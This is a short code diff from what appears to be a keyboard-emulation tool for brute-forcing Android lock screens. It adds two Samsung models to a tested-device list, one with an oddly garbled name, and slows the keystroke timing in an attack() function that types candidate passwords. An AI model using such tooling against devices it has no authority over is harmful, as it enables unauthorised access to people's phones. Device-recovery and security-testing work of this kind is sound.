@@ -1,12 +1,15 @@
 //Samsung Galaxy Tab A with Android 5.0.2
 //Samsung GT-N8010 (Galaxy Notes 10.1) with Android 4.1.2
+//Samsung  Galaxy S6 with Android 5.1.1
+//Samsung Rlrr Frr (Galaxy S4) with Android 5.0.1
 
 void attack(char* aPassword, char* aLogin = "", int delayLoginChange = 0)
 {
   for (int j = 0 ; j < strlen(aPassword) ; j++) {
     typeLetter(aPassword[j]);
-    delay(75);
+    delay(125);
   }
+  delay(50);
   typeEnter();
   delay(500);
 }
